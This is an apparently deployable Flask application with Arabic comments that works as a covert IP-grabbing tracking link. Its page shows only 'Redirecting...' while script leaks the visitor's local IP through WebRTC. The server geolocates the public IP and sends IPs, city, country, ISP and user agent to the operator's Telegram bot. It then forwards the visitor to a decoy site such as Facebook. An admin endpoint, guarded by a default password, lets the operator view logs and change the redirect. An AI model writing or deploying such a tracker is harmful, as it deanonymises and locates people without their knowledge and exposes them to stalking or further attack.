import os
import sqlite3
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import requests

app = Flask(__name__)

# إعداد تقييد الطلبات لحماية الخادم
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")  # كلمة مرور لوحة التحكم

# إعداد قاعدة البيانات وتأكيد وجود الجدول
DB_NAME = "analytics.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS settings 
                 (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  timestamp TEXT, public_ip TEXT, local_ip TEXT, 
                  country TEXT, city TEXT, isp TEXT, user_agent TEXT)''')
    
    # تعيين رابط التحويل الافتراضي إن لم يكن موجوداً
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_url', 'https://www.facebook.com')")
    conn.commit()
    conn.close()

init_db()

def get_target_url():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = 'target_url'")
    row = c.fetchone()
    conn.close()
    return row[0] if row else "https://www.facebook.com"

def set_target_url(new_url):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE settings SET value = ? WHERE key = 'target_url'", (new_url,))
    conn.commit()
    conn.close()

def log_to_db(public_ip, local_ip, country, city, isp, user_agent):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute('''INSERT INTO logs (timestamp, public_ip, local_ip, country, city, isp, user_agent)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''', 
              (now, public_ip, local_ip, country, city, isp, user_agent))
    conn.commit()
    conn.close()

def send_telegram(message):
    if BOT_TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            print("Telegram Error:", e)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        async function getLocalIP() {
            return new Promise((resolve) => {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        resolve("غير معروف / محجوب");
                        return;
                    }
                    let ipMatch = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ipMatch) {
                        resolve(ipMatch[1]);
                        pc.onicecandidate = () => {};
                    }
                };
                setTimeout(() => resolve("غير معروف / محجوب"), 1200);
            });
        }

        async function sendDataAndRedirect() {
            let localIp = await getLocalIP();
            
            await fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ local_ip: localIp })
            });

            window.location.href = "{{ target_url }}";
        }

        sendDataAndRedirect();
    </script>
</body>
</html>
"""

@app.route('/')
@limiter.limit("10 per minute")
def index():
    target_url = get_target_url()
    return render_template_string(HTML_TEMPLATE, target_url=target_url)

@app.route('/log_data', methods=['POST'])
def log_data():
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if public_ip and ',' in public_ip:
        public_ip = public_ip.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent', 'Unknown')
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'غير معروف')

    country, city, isp = "غير معروف", "غير معروف", "غير معروف"
    
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=3).json()
        if geo_res.get('status') == 'success':
            country = geo_res.get('country', 'غير معروف')
            city = geo_res.get('city', 'غير معروف')
            isp = geo_res.get('isp', 'غير معروف')
    except Exception as e:
        print("Geo IP error:", e)

    # حفظ في قاعدة البيانات
    log_to_db(public_ip, local_ip, country, city, isp, user_agent)

    # إرسال إلى التلغرام
    msg = (
        f"🎯 *زيارة جديدة للرابط!*\n\n"
        f"🌐 *Public IP:* `{public_ip}`\n"
        f"🏠 *Local IP:* `{local_ip}`\n"
        f"🏳️ *الدولة:* `{country}`\n"
        f"🏙️ *المدينة:* `{city}`\n"
        f"📡 *ISP:* `{isp}`\n"
        f"📱 *User Agent:* `{user_agent}`"
    )
    send_telegram(msg)
    return '', 200

# لوحة تحكم بسيطة لإحصائيات الزيارات
@app.route('/admin')
def admin_panel():
    pass_arg = request.args.get('pass')
    if pass_arg != ADMIN_PASSWORD:
        return jsonify({"error": "غير مصرح لك بالدخول"}), 403

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 50")
    logs = c.fetchall()
    c.execute("SELECT COUNT(*) FROM logs")
    total_visits = c.fetchone()[0]
    conn.close()

    current_target = get_target_url()
    return jsonify({
        "total_visits": total_visits,
        "current_redirect_url": current_target,
        "recent_logs": logs
    })

# تغيير رابط التحويل عن بعد
@app.route('/set_url')
def change_url():
    pass_arg = request.args.get('pass')
    new_url = request.args.get('url')
    if pass_arg != ADMIN_PASSWORD:
        return jsonify({"error": "غير مصرح لك"}), 403
    if not new_url:
        return jsonify({"error": "يرجى تحديد الرابط الجديد"}), 400

    set_target_url(new_url)
    send_telegram(f"⚙️ *تم تغيير رابط التحويل بنجاح إلى:*\n{new_url}")
    return jsonify({"status": "success", "new_url": new_url})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    
